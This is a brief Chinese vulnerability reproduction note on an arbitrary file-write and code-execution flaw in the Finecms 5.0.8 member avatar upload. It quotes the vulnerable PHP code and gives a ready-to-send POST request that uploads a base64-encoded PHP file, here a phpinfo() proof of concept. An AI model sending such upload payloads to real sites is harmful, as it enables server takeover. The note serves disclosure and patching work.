Finecms 5.0.8 会员中心任意代码执行漏洞
======================================

一、漏洞简介
------------

二、漏洞影响
------------

Finecms 5.0.8

三、复现过程
------------

### 漏洞分析

在文件`./controllersmemberAccount.php`中的upload函数

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                    $new_file = $dir.'0x0.'.$result[2];
                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                        exit(dr_json(0, '目录权限不足或磁盘已满'));
                    

### 漏洞复现

注册会员，登录访问：

    http://www.0-sec.org:88/index.php?s=member&c=account&m=upload

    POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+

2.png

3.png

参考链接
--------

> http://4o4notfound.org/index.php/archives/40/
